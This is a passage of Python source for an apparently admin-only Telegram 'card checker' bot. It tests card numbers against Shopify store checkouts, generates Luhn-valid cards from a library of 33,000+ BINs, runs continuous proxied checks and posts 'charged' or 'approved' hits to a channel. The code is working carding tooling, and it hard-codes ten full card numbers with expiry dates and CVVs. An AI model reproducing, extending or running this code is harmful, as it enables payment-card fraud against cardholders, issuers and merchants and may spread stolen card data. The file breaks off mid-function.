import os
import asyncio
import logging
import random
import time
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)
from api import process_card, parse_cc_string, extract_clean_response, fetch_products

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ["BOT_TOKEN"]
CHANNEL_ID = int(os.environ["CHANNEL_ID"])
ADMIN_ID = int(os.environ.get("ADMIN_ID", "5451167865"))

# ─── Active sessions (user_id → session state) ─────────────
active_sessions = {}

# ─── BIN Library (loaded from bins_library.json) ───────────
import json as _json

_BIN_LIB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'bins_library.json')
try:
    with open(_BIN_LIB_PATH, 'r') as _f:
        BIN_LIBRARY = _json.load(_f)
except Exception:
    BIN_LIBRARY = []

# Country index for fast lookup
BIN_BY_COUNTRY = {}
for _b in BIN_LIBRARY:
    BIN_BY_COUNTRY.setdefault(_b['country'], []).append(_b)

# Top countries sorted by BIN count
TOP_COUNTRIES = sorted(BIN_BY_COUNTRY.keys(), key=lambda c: len(BIN_BY_COUNTRY[c]), reverse=True)

TEST_CARDS = [
    "5275150060415544|05|27|803",
    "5275150094498722|06|28|271",
    "5597580170432727|02|29|669",
    "4890222002785710|08|29|313",
    "4147342094178599|10|27|885",
    "5275150165633736|11|29|675",
    "5143773871130026|05|26|705",
    "5275150182030312|08|29|950",
    "4031633018355571|06|28|951",
    "4064980980901258|12|30|252",
]

DEAD_KEYWORDS = [
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error', 'http 404',
    'url rejected', 'malformed input', 'amount_too_small',
    'site dead', 'captcha_required', 'captcha required', 'site errors',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'generic_error', 'generic error', 'site not supported',
]

WORKING_KEYWORDS = [
    'card_declined', 'fraud', 'incorrect_zip', 'invalid_cvc', 'invalid_cvv',
    'insufficient_funds', 'otp_required', 'order_placed', 'declined',
    'do_not_honor', 'incorrect_number', 'card_incorrect', 'expired_card',
    'pickup_card', 'restricted_card', 'stolen_card', 'lost_card',
    'card_velocity_exceeded', 'transaction_not_allowed', 'invalid_expiry',
    'processing_error', 'call_issuer', 'try_again_later', 'fraudulent',
    'security_violation', 'blocked', 'bad_cvv', 'cvv_fail',
    'authentication_required', 'mismatched_bill', 'charged', 'approved',
    'wrong_number', 'incorrect number', 'card incorrect',
]


# ─── Helpers ────────────────────────────────────────────────


def is_admin(update: Update) -> bool:
    return update.effective_user.id == ADMIN_ID


async def deny(update: Update):
    target = update.message or (update.callback_query and update.callback_query.message)
    if target:
        await target.reply_text("⛔ Access denied. Admin only.")


def classify_result(success, message):
    msg = message.lower()
    if 'order_placed' in msg:
        return 'charged'
    if 'otp_required' in msg:
        return 'tds'
    if any(k in msg for k in ['approved', 'insufficient', 'cvv', 'cvc', 'zip',
                               'incorrect_zip', 'invalid_cvv', 'invalid_cvc',
                               'insufficient_funds']):
        return 'approved'
    if success:
        return 'declined'
    for kw in WORKING_KEYWORDS:
        if kw in msg:
            return 'declined'
    if any(k in msg for k in DEAD_KEYWORDS):
        return 'error'
    return 'error'


def approved_message(message):
    msg = message.lower()
    if 'insufficient' in msg:
        return 'INSUFFICIENT_FUNDS'
    if 'invalid_cvv' in msg or ('cvv' in msg and 'invalid' in msg):
        return 'INVALID_CVV'
    if 'invalid_cvc' in msg or ('cvc' in msg and 'invalid' in msg):
        return 'INVALID_CVC'
    if 'incorrect_zip' in msg or 'zip' in msg:
        return 'INCORRECT_ZIP'
    if 'cvv' in msg:
        return 'INVALID_CVV'
    if 'cvc' in msg:
        return 'INVALID_CVC'
    clean = extract_clean_response(message)
    return clean.upper().replace(' ', '_')


async def get_bin_info(cc):
    try:
        bin6 = cc[:6]
        async with aiohttp.ClientSession() as session:
            async with session.get(
                f"https://bins.antipublic.cc/bins/{bin6}", timeout=aiohttp.ClientTimeout(total=5)
            ) as res:
                if res.status == 200:
                    data = await res.json()
                    return {
                        'brand': data.get('brand', 'UNKNOWN'),
                        'bank': data.get('bank', 'UNKNOWN'),
                        'country': data.get('country_name', 'UNKNOWN'),
                        'level': data.get('level', 'N/A'),
                        'type': data.get('type', 'N/A'),
                        'flag': data.get('country_flag', ''),
                    }
    except Exception:
        pass
    return {'brand': 'UNKNOWN', 'bank': 'UNKNOWN', 'country': 'UNKNOWN',
            'level': 'N/A', 'type': 'N/A', 'flag': ''}


def generate_cards_from_bin(bin_str, count=10):
    bin_str = bin_str.strip().replace(' ', '')
    bin_digits = ''.join(c for c in bin_str if c.isdigit() or c == 'x')
    if len(bin_digits) < 6:
        return []
    cards = []
    for _ in range(count):
        cc = ''
        for i, ch in enumerate(bin_digits[:16]):
            if ch == 'x':
                cc += str(random.randint(0, 9))
            else:
                cc += ch
        while len(cc) < 16:
            cc += str(random.randint(0, 9))
        # Luhn fix
        digits = [int(d) for d in cc[:15]]
        odd_sum = sum(digits[0::2])
        even_sum = 0
        for d in digits[1::2]:
            d2 = d * 2
            even_sum += d2 - 9 if d2 > 9 else d2
        check = (10 - (odd_sum + even_sum) % 10) % 10
        cc = cc[:15] + str(check)
        month = str(random.randint(1, 12)).zfill(2)
        year = str(random.randint(26, 30))
        cvv = str(random.randint(100, 999))
        cards.append(f"{cc}|{month}|{year}|{cvv}")
    return cards


def fmt_price(price, currency):
    try:
        if not price or price == '0':
            return "Free"
        return f"${float(price):.2f} {currency}"
    except Exception:
        return f"${price} {currency}"


def fmt_info(brand, type_cc, level):
    if level and level != 'N/A':
        return f"{brand} - {type_cc.upper()} - {level.upper()}"
    return f"{brand} - {type_cc.upper()}"


async def run_with_retry(parts, site, proxy_str=None, max_retries=3):
    last_success, last_msg, last_gate, last_price, last_cur = False, 'ERROR', '', '0', 'USD'
    for attempt in range(max_retries):
        try:
            success, message, gateway, price, currency = await process_card(
                parts['cc'], parts['mes'], parts['ano'], parts['cvv'], site, None, proxy_str
            )
            last_success, last_msg, last_gate, last_price, last_cur = (
                success, message, gateway, price, currency
            )
            category = classify_result(success, message)
            if category != 'error' or any(k in message.lower() for k in WORKING_KEYWORDS):
                return success, message, gateway, price, currency, category
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
        except Exception as e:
            last_msg = f"Error: {str(e)}"
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
    return last_success, last_msg, last_gate, last_price, last_cur, 'error'


def build_result_text(cc_string, category, clean, price_fmt, info_str, bank, country, flag):
    if category == 'charged':
        status = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
    elif category == 'approved':
        status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
    elif category == 'tds':
        status = "𝟑𝐃𝐒 ❎"
    elif category == 'declined':
        status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    else:
        status = "𝐄𝐫𝐫𝐨𝐫 ⚠️"

    return (
        f"ア 𝐂𝐚𝐫𝐝 ➜ <code>{cc_string}</code>\n"
        f"カ 𝙎𝙩𝙖𝙩𝙪𝙨 ➜ {status}\n"
        f"ツ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {clean}\n"
        f"キ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ 𝐀𝐮𝐭𝐨 𝐒𝐡𝐨𝐩𝐢𝐟𝐲\n"
        f"千 𝐏𝐫𝐢𝐜𝐞 ➜ {price_fmt}\n"
        f"━━━━━━━━━━━━━\n"
        f"零 𝙄𝙣𝙛𝙤 ➜ {info_str}\n"
        f"零 𝘽𝙖𝙣𝙠 ➜ {bank}\n"
        f"零 𝘾𝙤𝙪𝗻𝘁𝗿𝐲 ➜ {country} {flag}\n"
        f"━━━━━━━━━━━━━\n"
        f"力 𝐃𝐞𝐯 ➜ @Xoarch"
    )


def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 𝐒𝐢𝐧𝐠𝐥𝐞 𝐂𝐡𝐞𝐜𝐤", callback_data="btn_chk"),
         InlineKeyboardButton("📋 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤", callback_data="btn_mass")],
        [InlineKeyboardButton("🌐 𝐒𝐢𝐭𝐞 𝐂𝐡𝐞𝐜𝐤", callback_data="btn_site"),
         InlineKeyboardButton("📡 𝐌𝐚𝐬𝐬 𝐒𝐢𝐭𝐞", callback_data="btn_msite")],
        [InlineKeyboardButton("🏦 𝐁𝐈𝐍 𝐋𝐨𝐨𝐤𝐮𝐩", callback_data="btn_bin"),
         InlineKeyboardButton("🎲 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞", callback_data="btn_gen")],
        [InlineKeyboardButton("⚡ 𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤", callback_data="btn_autochk"),
         InlineKeyboardButton("🛑 𝐒𝐭𝐨𝐩", callback_data="btn_stop")],
        [InlineKeyboardButton("❓ 𝐇𝐞𝐥𝐩", callback_data="btn_help")],
    ])


def back_button():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 𝐁𝐚𝐜𝐤 𝐭𝐨 𝐌𝐞𝐧𝐮", callback_data="btn_back")]
    ])


BANNER = (
    "███████╗██╗  ██╗ ██████╗ ██████╗ ██╗███████╗██╗   ██╗\n"
    "██╔════╝██║  ██║██╔═══██╗██╔══██╗██║██╔════╝╚██╗ ██╔╝\n"
    "███████╗███████║██║   ██║██████╔╝██║█████╗   ╚████╔╝ \n"
    "╚════██║██╔══██║██║   ██║██╔═══╝ ██║██╔══╝    ╚██╔╝  \n"
    "███████║██║  ██║╚██████╔╝██║     ██║██║        ██║   \n"
    "╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝        ╚═╝   \n"
)


# ─── /start and main menu ──────────────────────────────────


async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await deny(update)
        return
    await update.message.reply_text(
        f"{BANNER}\n𝐖𝐞𝐥𝐜𝐨𝐦𝐞! Select an option below 👇",
        reply_markup=main_menu_keyboard(),
    )


async def show_menu(query, context):
    await query.edit_message_text(
        f"{BANNER}\n𝐖𝐞𝐥𝐜𝐨𝐦𝐞! Select an option below 👇",
        reply_markup=main_menu_keyboard(),
    )


# ─── Button router ─────────────────────────────────────────


async def button_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if not is_admin(update):
        await deny(update)
        return

    data = query.data

    if data == "btn_back":
        context.user_data['awaiting'] = None
        await show_menu(query, context)
        return

    if data == "btn_chk":
        await query.edit_message_text(
            "🔍 <b>𝐒𝐢𝐧𝐠𝐥𝐞 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
            "Send card and site in this format:\n"
            "<code>cc|mm|yy|cvv site_url</code>\n\n"
            "Example:\n<code>4242424242424242|12|28|123 https://example.com</code>\n\n"
            "Or use: /chk <code>cc|mm|yy|cvv site_url</code>",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'chk'
        return

    if data == "btn_mass":
        await query.edit_message_text(
            "📋 <b>𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
            "Send site URL and cards together:\n"
            "<code>site_url</code>\n"
            "<code>cc|mm|yy|cvv</code>\n"
            "<code>cc|mm|yy|cvv</code>\n...\n\n"
            "First line = site URL, rest = cards.\n"
            "Or send a .txt file with cards after the site URL.\n\n"
            "Or use: /mass <code>site_url</code> (reply to card file)",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'mass'
        return

    if data == "btn_site":
        await query.edit_message_text(
            "🌐 <b>𝐒𝐢𝐭𝐞 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
            "Send the site URL to check:\n\n"
            "Or use: /site <code>url</code>",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'site'
        return

    if data == "btn_msite":
        await query.edit_message_text(
            "📡 <b>𝐌𝐚𝐬𝐬 𝐒𝐢𝐭𝐞 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
            "Send sites (one per line) or a .txt file:\n\n"
            "Or use: /msite (reply to site file)",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'msite'
        return

    if data == "btn_bin":
        await query.edit_message_text(
            "🏦 <b>𝐁𝐈𝐍 𝐋𝐨𝐨𝐤𝐮𝐩</b>\n\n"
            "Send the first 6 digits of a card:\n\n"
            "Or use: /bin <code>123456</code>",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'bin'
        return

    if data == "btn_gen":
        await query.edit_message_text(
            "🎲 <b>𝐁𝐈𝐍 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐨𝐫</b>\n\n"
            "Send BIN (6-16 digits) and optional count:\n"
            "<code>527515 10</code>\n\n"
            "Use <code>x</code> for random digits:\n"
            "<code>527515xxxxxxxxxx 20</code>\n\n"
            "Or use: /gen <code>bin [count]</code>",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'gen'
        return

    if data == "btn_autochk":
        # Show top countries to pick BINs from
        kb = []
        for c in TOP_COUNTRIES[:20]:
            count = len(BIN_BY_COUNTRY[c])
            short = c[:22]
            kb.append([InlineKeyboardButton(
                f"🌍 {short} ({count} BINs)",
                callback_data=f"acountry_{TOP_COUNTRIES.index(c)}",
            )])
        kb.append([InlineKeyboardButton("🔎 𝐒𝐞𝐚𝐫𝐜𝐡 𝐁𝐈𝐍", callback_data="abin_search")])
        kb.append([InlineKeyboardButton("🎲 𝐑𝐚𝐧𝐝𝐨𝐦 𝐁𝐈𝐍", callback_data="abin_random")])
        kb.append([InlineKeyboardButton("✏️ 𝐂𝐮𝐬𝐭𝐨𝐦 𝐁𝐈𝐍", callback_data="abin_custom")])
        kb.append([InlineKeyboardButton("🔙 𝐁𝐚𝐜𝐤 𝐭𝐨 𝐌𝐞𝐧𝐮", callback_data="btn_back")])
        await query.edit_message_text(
            f"⚡ <b>𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
            f"📚 BIN Library: <b>{len(BIN_LIBRARY)}</b> BINs from <b>{len(TOP_COUNTRIES)}</b> countries\n\n"
            "Select country, search, or enter custom BIN:\n"
            "Generates cards and checks continuously until stopped.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(kb),
        )
        return

    if data.startswith("acountry_"):
        idx = int(data.replace("acountry_", ""))
        country = TOP_COUNTRIES[idx]
        country_bins = BIN_BY_COUNTRY[country]
        # Show first 20 BINs from this country
        kb = []
        for i, b in enumerate(country_bins[:20]):
            label = f"{b['brand']} | {b['bin']} | {b['bank'][:18]}"
            kb.append([InlineKeyboardButton(label, callback_data=f"apick_{b['bin']}")])
        if len(country_bins) > 20:
            kb.append([InlineKeyboardButton(
                f"🎲 Random from {country[:15]} ({len(country_bins)} total)",
                callback_data=f"arand_{idx}",
            )])
        kb.append([InlineKeyboardButton("🔙 𝐁𝐚𝐜𝐤", callback_data="btn_autochk")])
        await query.edit_message_text(
            f"⚡ <b>{country}</b> — {len(country_bins)} BINs\n\n"
            "Select a BIN:",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(kb),
        )
        return

    if data.startswith("arand_"):
        idx = int(data.replace("arand_", ""))
        country = TOP_COUNTRIES[idx]
        country_bins = BIN_BY_COUNTRY[country]
        b = random.choice(country_bins)
        context.user_data['autochk_bin'] = b['bin']
        await query.edit_message_text(
            f"⚡ <b>𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
            f"🎲 Random BIN: <code>{b['bin']}</code>\n"
            f"{b['brand']} | {b['bank']} | {b['country']}\n"
            f"Type: {b['type']} | Level: {b['level']}\n\n"
            "Now send the site URL to check against:",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'autochk_site'
        return

    if data.startswith("apick_"):
        bin_num = data.replace("apick_", "")
        context.user_data['autochk_bin'] = bin_num
        # Find bin info
        b = next((x for x in BIN_LIBRARY if x['bin'] == bin_num), None)
        info_text = f"{b['brand']} | {b['bank']} | {b['country']}" if b else bin_num
        await query.edit_message_text(
            f"⚡ <b>𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
            f"BIN: <code>{bin_num}</code>\n{info_text}\n\n"
            "Now send the site URL to check against:",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'autochk_site'
        return

    if data == "abin_search":
        await query.edit_message_text(
            "⚡ <b>𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤</b> — Search\n\n"
            "Send a search query (country, bank, or BIN digits):\n"
            "Example: <code>CHASE</code> or <code>INDIA</code> or <code>4147</code>",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'autochk_search'
        return

    if data == "abin_random":
        b = random.choice(BIN_LIBRARY) if BIN_LIBRARY else None
        if not b:
            await query.edit_message_text("BIN library is empty.", reply_markup=main_menu_keyboard())
            return
        context.user_data['autochk_bin'] = b['bin']
        await query.edit_message_text(
            f"⚡ <b>𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
            f"🎲 Random BIN: <code>{b['bin']}</code>\n"
            f"{b['brand']} | {b['bank']} | {b['country']}\n"
            f"Type: {b['type']} | Level: {b['level']}\n\n"
            "Now send the site URL to check against:",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'autochk_site'
        return

    if data == "abin_custom":
        await query.edit_message_text(
            "⚡ <b>𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
            "Send your custom BIN (6-16 digits):\n"
            "Example: <code>527515</code> or <code>527515xxxxxxxxxx</code>",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'autochk_bin'
        return

    if data == "aproxy_yes":
        await query.edit_message_text(
            "⚡ <b>𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
            "Send proxy in format:\n"
            "<code>host:port</code> or <code>user:pass@host:port</code>\n\n"
            "Supports HTTP/SOCKS5.",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'autochk_proxy'
        return

    if data == "aproxy_no":
        context.user_data['autochk_proxy'] = None
        user_id = update.effective_user.id
        await query.edit_message_text("⚡ Starting Auto Check... ⏳", parse_mode="HTML")
        asyncio.create_task(
            run_continuous_autochk(update, context, user_id, query.message)
        )
        return

    if data == "btn_stop":
        user_id = update.effective_user.id
        if user_id in active_sessions:
            active_sessions[user_id]['running'] = False
            await query.edit_message_text(
                "🛑 <b>Stopping session...</b> Please wait.",
                parse_mode="HTML",
            )
        else:
            await query.edit_message_text(
                "No active session to stop.",
                reply_markup=main_menu_keyboard(),
            )
        return

    if data == "btn_help":
        context.user_data['awaiting'] = None
        await query.edit_message_text(
            "<b>𝐇𝐞𝐥𝐩 ❓</b>\n\n"
            "🔍 <b>Single Check</b> — /chk <code>cc|mm|yy|cvv site</code>\n"
            "📋 <b>Mass Check</b> — /mass <code>site</code> (reply to card file)\n"
            "🌐 <b>Site Check</b> — /site <code>url</code>\n"
            "📡 <b>Mass Site</b> — /msite (reply to site file)\n"
            "🏦 <b>BIN Lookup</b> — /bin <code>123456</code>\n"
            "🎲 <b>Generate</b> — /gen <code>bin [count]</code>\n"
            "⚡ <b>Auto Check</b> — Continuous BIN checker (button or /autochk)\n"
            "🛑 <b>Stop</b> — /stop to halt running Auto Check\n\n"
            "<b>Auto Check Features:</b>\n"
            "• BIN Library (33,000+ BINs from 200+ countries)\n"
            "• Browse by country, search, or random BIN\n"
            "• Proxy support (optional)\n"
            "• Runs continuously until you press Stop\n"
            "• Live status updates every 5 seconds\n"
            "• Charged/Approved CCs posted to channel\n\n"
            "<b>𝐅𝐨𝐫𝐦𝐚𝐭𝐬:</b>\n"
            "Card: <code>cc_number|mm|yy|cvv</code>\n"
            "Site: <code>https://example.com</code>\n"
            "BIN: <code>527515</code> or <code>527515xxxxxxxxxx</code>\n\n"
            "𝐃𝐞𝐯 ➜ @Xoarch",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        return


# ─── Slash command handlers ────────────────────────────────


async def chk_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await deny(update)
        return
    if len(context.args) < 2:
        await update.message.reply_text(
            "Usage: /chk <code>cc|mm|yy|cvv site_url</code>", parse_mode="HTML"
        )
        return
    text = f"{context.args[0]} {context.args[1]}"
    await handle_single_check(update, context, text)


async def mass_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await deny(update)
        return
    if not context.args:
        await update.message.reply_text(
            "Usage: /mass <code>site_url</code> (reply to a .txt file with cards)",
            parse_mode="HTML",
        )
        return

    site = context.args[0]
    if not site.startswith('http'):
        site = 'https://' + site

    cards = []
    if update.message.reply_to_message:
        if update.message.reply_to_message.document:
            file = await update.message.reply_to_message.document.get_file()
            data = await file.download_as_bytearray()
            cards = [l.strip() for l in data.decode('utf-8', errors='ignore').splitlines() if '|' in l.strip()]
        elif update.message.reply_to_message.text:
            cards = [l.strip() for l in update.message.reply_to_message.text.splitlines() if '|' in l]

    if len(context.args) > 1:
        for arg in context.args[1:]:
            if '|' in arg:
                cards.append(arg)

    if not cards:
        await update.message.reply_text("No cards found. Reply to a file or send cards.")
        return

    await handle_mass_check(update, context, cards, site)


async def site_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await deny(update)
        return
    if not context.args:
        await update.message.reply_text("Usage: /site <code>url</code>", parse_mode="HTML")
        return
    await handle_site_check(update, context, context.args[0])


async def msite_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await deny(update)
        return

    sites = []
    if update.message.reply_to_message:
        if update.message.reply_to_message.document:
            file = await update.message.reply_to_message.document.get_file()
            data = await file.download_as_bytearray()
            sites = [l.strip() for l in data.decode('utf-8', errors='ignore').splitlines() if l.strip()]
        elif update.message.reply_to_message.text:
            sites = [l.strip() for l in update.message.reply_to_message.text.splitlines() if l.strip()]

    if not sites:
        default_path = os.path.join(os.path.dirname(__file__), 'sites.txt')
        if os.path.isfile(default_path):
            with open(default_path, 'r', encoding='utf-8') as f:
                sites = [l.strip() for l in f if l.strip()]

    if not sites:
        await update.message.reply_text("No sites found. Reply to a file with /msite")
        return

    await handle_mass_site(update, context, sites)


async def bin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await deny(update)
        return
    if not context.args:
        await update.message.reply_text("Usage: /bin <code>123456</code>", parse_mode="HTML")
        return
    await handle_bin_lookup(update, context, context.args[0])


async def gen_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await deny(update)
        return
    if not context.args:
        await update.message.reply_text(
            "Usage: /gen <code>bin [count]</code>\nExample: /gen 527515 10",
            parse_mode="HTML",
        )
        return
    bin_str = context.args[0]
    count = 10
    if len(context.args) > 1:
        try:
            count = min(int(context.args[1]), 50)
        except ValueError:
            pass
    await handle_gen(update, context, bin_str, count)


async def autochk_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await deny(update)
        return
    if not context.args:
        await update.message.reply_text(
            "Usage: /autochk <code>bin site</code>\n"
            "Example: /autochk 527515 https://example.com\n\n"
            "Or use the ⚡ Auto Check button for guided flow with BIN library.",
            parse_mode="HTML",
        )
        return
    bin_str = context.args[0]
    if len(context.args) < 2:
        # Only BIN provided, ask for site
        context.user_data['autochk_bin'] = bin_str
        await update.message.reply_text(
            f"⚡ BIN set: <code>{bin_str}</code>\n\nNow send the site URL:",
            parse_mode="HTML",
            reply_markup=back_button(),
        )
        context.user_data['awaiting'] = 'autochk_site'
        return
    site = context.args[1]
    context.user_data['autochk_bin'] = bin_str
    context.user_data['autochk_site'] = site
    context.user_data['autochk_proxy'] = None
    user_id = update.effective_user.id
    msg = await update.message.reply_text("⚡ Starting Auto Check... ⏳", parse_mode="HTML")
    asyncio.create_task(
        run_continuous_autochk(update, context, user_id, msg)
    )


async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await deny(update)
        return
    user_id = update.effective_user.id
    if user_id in active_sessions:
        active_sessions[user_id]['running'] = False
        await update.message.reply_text(
            "🛑 <b>Stopping session...</b> Please wait.",
            parse_mode="HTML",
        )
    else:
        await update.message.reply_text(
            "No active session to stop.",
            reply_markup=main_menu_keyboard(),
        )


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await deny(update)
        return
    text = (
        "<b>𝐇𝐞𝐥𝐩 ❓</b>\n\n"
        "🔍 /chk <code>cc|mm|yy|cvv site</code> — Check single card\n"
        "📋 /mass <code>site</code> — Mass check (reply to card file)\n"
        "🌐 /site <code>url</code> — Check if site is alive\n"
        "📡 /msite — Mass site check (reply to file)\n"
        "🏦 /bin <code>123456</code> — BIN lookup\n"
        "🎲 /gen <code>bin [count]</code> — Generate cards from BIN\n"
        "⚡ /autochk <code>bin site</code> — Continuous auto check\n"
        "🛑 /stop — Stop running auto check\n"
        "/start — Show button menu\n\n"
        "<b>Auto Check Features:</b>\n"
        "• BIN Library (33,000+ BINs, 200+ countries)\n"
        "• Browse by country / Search / Random\n"
        "• Optional Proxy support\n"
        "• Runs infinitely until /stop\n"
        "• Live status every 5 sec\n"
        "• Hits posted to channel\n\n"
        "𝐃𝐞𝐯 ➜ @Xoarch"
    )
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=main_menu_keyboard())


# ─── Text message handler (for button flow) ────────────────


async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await deny(update)
        return

    awaiting = context.user_data.get('awaiting')
    text = update.message.text.strip()

    if awaiting == 'chk':
        context.user_data['awaiting'] = None
        await handle_single_check(update, context, text)

    elif awaiting == 'mass':
        context.user_data['awaiting'] = None
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        if not lines:
            await update.message.reply_text("No input found.", reply_markup=main_menu_keyboard())
            return
        site = lines[0]
        if not site.startswith('http'):
            site = 'https://' + site
        cards = [l for l in lines[1:] if '|' in l]
        if not cards:
            context.user_data['mass_site'] = site
            context.user_data['awaiting'] = 'mass_cards'
            await update.message.reply_text(
                f"Site set: <code>{site}</code>\n\n"
                "Now send cards (one per line) or a .txt file:",
                parse_mode="HTML", reply_markup=back_button(),
            )
            return
        await handle_mass_check(update, context, cards, site)

    elif awaiting == 'mass_cards':
        context.user_data['awaiting'] = None
        cards = [l.strip() for l in text.splitlines() if '|' in l.strip()]
        if not cards:
            await update.message.reply_text(
                "No valid cards. Format: <code>cc|mm|yy|cvv</code>",
                parse_mode="HTML", reply_markup=main_menu_keyboard(),
            )
            return
        site = context.user_data.get('mass_site', '')
        await handle_mass_check(update, context, cards, site)

    elif awaiting == 'site':
        context.user_data['awaiting'] = None
        await handle_site_check(update, context, text)

    elif awaiting == 'msite':
        context.user_data['awaiting'] = None
        sites = [l.strip() for l in text.splitlines() if l.strip()]
        if not sites:
            await update.message.reply_text("No sites found.", reply_markup=main_menu_keyboard())
            return
        await handle_mass_site(update, context, sites)

    elif awaiting == 'bin':
        context.user_data['awaiting'] = None
        await handle_bin_lookup(update, context, text)

    elif awaiting == 'gen':
        context.user_data['awaiting'] = None
        parts_raw = text.split()
        bin_str = parts_raw[0]
        count = 10
        if len(parts_raw) > 1:
            try:
                count = min(int(parts_raw[1]), 50)
            except ValueError:
                pass
        await handle_gen(update, context, bin_str, count)

    elif awaiting == 'autochk':
        context.user_data['awaiting'] = None
        parts_raw = text.split()
        if len(parts_raw) < 2:
            await update.message.reply_text(
                "Send: <code>bin site_url</code>",
                parse_mode="HTML", reply_markup=main_menu_keyboard(),
            )
            return
        bin_str = parts_raw[0]
        site = parts_raw[1]
        context.user_data['autochk_bin'] = bin_str
        context.user_data['autochk_site'] = site
        context.user_data['autochk_proxy'] = None
        user_id = update.effective_user.id
        msg = await update.message.reply_text("⚡ Starting Auto Check... ⏳", parse_mode="HTML")
        asyncio.create_task(
            run_continuous_autochk(update, context, user_id, msg)
        )

    elif awaiting == 'autochk_search':
        context.user_data['awaiting'] = None
        query_str = text.strip().upper()
        results = [b for b in BIN_LIBRARY if
                   query_str in b['bin'] or
                   query_str in b['country'].upper() or
                   query_str in b['bank'].upper() or
                   query_str in b['brand'].upper()][:20]
        if not results:
            await update.message.reply_text(
                f"No BINs found for '<code>{text.strip()}</code>'. Try another search.",
                parse_mode="HTML", reply_markup=main_menu_keyboard(),
            )
            return
        kb = []
        for b in results:
            label = f"{b['brand']} | {b['bin']} | {b['bank'][:15]} ({b['country'][:10]})"
            kb.append([InlineKeyboardButton(label, callback_data=f"apick_{b['bin']}")])
